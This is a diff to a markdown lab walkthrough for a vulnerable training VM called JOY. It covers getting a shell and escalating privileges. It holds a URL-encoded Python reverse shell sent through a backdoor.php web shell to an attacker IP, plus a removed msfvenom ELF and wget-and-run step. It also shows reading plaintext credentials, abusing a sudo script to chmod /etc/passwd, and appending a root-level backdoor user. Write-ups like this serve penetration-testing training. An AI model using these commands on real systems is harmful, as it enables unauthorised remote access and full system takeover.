@@ -2359,21 +2359,6 @@ Coincidentally, we were informed by the  `version_control` document that the web
 
 # 5. Getting a shell
 
-Generate reverse shell executable and place in web server root:
-
-(Apache2 is already running with DocumentRoot at `/var/www/html`)
-
-```console
-┌──(root㉿kali)-[~]
-└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 74 bytes
-Final size of elf file: 194 bytes
-Saved as: /var/www/html/reverse.elf
-```
-
 Open another console window on Kali to listen for connections:
 
 ```console
@@ -2382,25 +2367,136 @@ Open another console window on Kali to listen for connections:
 listening on [any] 4444 ...
 ```
 
-Getting the target to download and run the reverse shell:
+Getting the target to run the reverse shell:
 
-☝️ The command we want to run is `wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`, but since we are running it from URL, we need to URL encode the command
+There's a number of reverse shells on [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/), we'd use the python one here
+
+☝️ The command we want to run is `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, but since we are running it from URL, we need to URL encode the command
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# curl http://10.0.88.34/backdoor.php?cmd=wget%20http%3A%2F%2Fkali.vx%2Freverse.elf%20%26%26%20chmod%20%2Bx%20.%2Freverse.elf%20%26%26%20.%2Freverse.elf
+└─# curl http://10.0.88.34/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.17.10%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
 ```
 
 Verify that the reverse shell has hooked on from the listener console
 
 ```console
-connect to [192.168.17.10] from (UNKNOWN) [10.0.88.34] 53118
-whoami
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.34] 35038
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
 www-data
-id
+$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
-pwd
+$ pwd
 /var/www/tryingharderisjoy
 ```
 
 Well done, we now have a shell on the target as `www-data` user
+
+# 6. Privilege Escalation
+
+It may be tempting to start running PrivEsc scripts like [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases) but:
+1. Sometimes the route to privilege maybe nearer than you think, and
+2. PrivEsc scripts has such as large output that may send you down a rabbit hole
+
+☝️ Enumerate the folders at the `pwd` first, you may find the jewels closer than expected
+
+It turns out that Patrick's password is right under our noses:
+
+```console
+$ ls -l ossec
+total 96
+⋮
+-rw-r--r-- 1 www-data www-data   134 Jan  6  2019 patricksecretsofjoy
+⋮
+$ cat ossec/patricksecretsofjoy
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+how would these hack3rs ever find such a page?
+```
+
+We are also able to read `local.txt` as the `www-data` user
+
+```console
+$ cat /local.txt
+SNMP tells too much information about what may exist in a machine. :-)
+```
+
+Let's try to `su` to Patrick
+
+```console
+$ su patrick
+su: must be run from a terminal
+$ python -c "import pty; pty.spawn('/bin/bash')"
+www-data@JOY:/var/www/tryingharderisjoy$ su patrick
+su patrick
+Password: apollo098765
+```
+
+We got in as Patrick, again it may be tempting to start running PrivEsc scripts, but let's check what `sudo` right does Patrick have
+
+```console
+patrick@JOY:/var/www/tryingharderisjoy$ sudo -l
+sudo -l
+Matching Defaults entries for patrick on JOY:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User patrick may run the following commands on JOY:
+    (ALL) NOPASSWD: /home/patrick/script/test
+```
+
+The `/home/patrick/script/test` grants the ability to change permissions on any file as root, let's go straight for the `/etc/passwd` file
+
+```console
+patrick@JOY:/var/www/tryingharderisjoy$ sudo /home/patrick/script/test
+sudo /home/patrick/script/test
+I am practising how to do simple bash scripting!
+What file would you like to change permissions within this directory?
+../../../etc/passwd
+../../../etc/passwd
+What permissions would you like to set the file to?
+777
+777
+Currently changing file permissions, please wait.
+Tidying up...
+Done!
+```
+
+Generate the password hash for our backdoor user:
+
+```console
+┌──(root㉿kali)-[~]
+└─# openssl passwd -1 -salt randsalt password
+$1$randsalt$2YAi0Y4nexy6ittpehVgA1
+```
+
+Add the backdoor user into the `/etc/passwd` file
+
+```console
+patrick@JOY:/var/www/tryingharderisjoy$ echo 'backdoor:$1$randsalt$2YAi0Y4nexy6ittpehVgA1:0:0:root:/root:/bin/bash' >> /etc/passwd
+<ittpehVgA1:0:0:root:/root:/bin/bash' >> /etc/passwd
+patrick@JOY:/var/www/tryingharderisjoy$ tail -n 1 /etc/passwd
+tail -n 1 /etc/passwd
+backdoor:$1$randsalt$2YAi0Y4nexy6ittpehVgA1:0:0:root:/root:/bin/bash
+```
+
+Login as the backdoor user and retrieve the `proof.txt`!
+
+```console
+patrick@JOY:/var/www/tryingharderisjoy$ su backdoor
+su backdoor
+Password: password
+
+root@JOY:/var/www/tryingharderisjoy# ls -l /root
+ls -l /root
+total 40
+⋮
+---------- 1 root root   71 Jan 10  2019 proof.txt
+⋮
+root@JOY:/var/www/tryingharderisjoy# cat /root/proof.txt
+cat /root/proof.txt
+Never grant sudo permissions on scripts that perform system functions!
+```
